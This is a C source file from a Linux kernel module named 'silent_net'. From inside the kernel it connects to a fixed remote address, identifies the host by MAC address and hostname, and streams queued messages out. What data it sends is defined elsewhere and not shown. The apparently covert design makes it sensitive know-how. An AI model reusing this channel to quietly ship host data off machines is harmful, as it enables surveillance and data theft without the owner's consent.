/*
 *	'silent_net' data transmission
 *
 *
 *	Omer Kfir (C)
 */

#include "transmission.h"

static struct socket *sock;    // Struct socket
static bool connected = false; // Boolean which indicates if currently connected
static struct mutex trns_mutex; // Mutex for thread safe socket handling

static char cred[BUFFER_SIZE];

void transmit_data(struct work_struct *work) {
  wq_msg *curr_msg = container_of(work, wq_msg, work);
  int ret;

  mutex_lock(&trns_mutex);

  /* If socket is disconnected try to connect */
  if (!connected) {
    /* When a socket disconnects a new socket needs to be created */
    sock = tcp_sock_create();
    if (IS_ERR(sock)) {
      sock = NULL;
      goto end;
    }

    ret = tcp_sock_connect(sock, DEST_IP, DEST_PORT);
    if (ret < 0) {
      tcp_sock_close(sock);
      sock = NULL;
      goto end;
    }
    connected = true;

    // Send credentials - only after successful connection
    ret = tcp_send_msg(sock, cred, strlen(cred));
    if (ret < 0) {
      connected = false;
      tcp_sock_close(sock);
      sock = NULL;
      goto end;
    }
  }

  ret = tcp_send_msg(sock, curr_msg->msg_buf, curr_msg->length);
  if (ret < 0) {
    connected = false;
    tcp_sock_close(sock);
    sock = NULL;
  }

end:
  mutex_unlock(&trns_mutex);
  kfree(curr_msg); // Free the work structure
}

void handle_credentials(void) {
  char mac_buf[MAC_SIZE];
  get_mac_address(mac_buf);

  protocol_format(cred, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%s",
                  MSG_AUTH, mac_buf, utsname()->nodename);
}

/* Initialize all transmission objects */
void data_transmission_init(void) {
  mutex_init(&trns_mutex);
  handle_credentials();
}

/* Closes all transmission objects */
void data_transmission_release(void) {
  // Close socket
  tcp_sock_close(sock);

  /*
   * No need for releasing trns_mutex since
   * The operating system knows to release it on
   * It's own when module is unloaded
   */
}
